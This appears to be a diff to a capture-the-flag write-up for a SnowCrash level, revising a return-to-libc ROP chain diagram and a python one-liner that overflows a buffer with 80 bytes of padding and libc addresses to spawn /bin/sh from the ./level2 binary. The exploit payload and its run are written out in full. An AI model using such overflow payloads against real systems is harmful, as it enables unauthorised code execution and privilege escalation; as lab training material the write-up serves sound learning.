@@ -40,10 +40,10 @@ system =  0xb7e6b060
 [...]
 
 # This is how we build our ROP chain:
-	GARBAGE ->   PUTS    -> PUTS ARGUMENT ->   SYSTEM    -> SYSTEM ARGUMENT
-     AAAAA     0x080483f0    "/bin/sh"        0xb7e6b060     "/bin/sh"
+	GARBAGE ->   PUTS    ->    SYSTEM   ->  PUTS ARGUMENT -> SYSTEM ARGUMENT
+     AAAAA     0x080483f0    0xb7e6b060      "/bin/sh"           "/bin/sh"
 
-python -c 'print "\x41"*80+"\xf0\x83\x04\x08"+"\x60\xb0\xe6\xb7"+"\x58\xcc\xf8\xb7"*8' > /tmp/j
+python -c 'print "\x41"*80+"\xf0\x83\x04\x08"+"\x60\xb0\xe6\xb7"+"\x58\xcc\xf8\xb7"*2' > /tmp/j
 level2@SnowCrash:~$ cat /tmp/j - | ./level2
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��`��X���X���
 ���t$�t$ �\$���
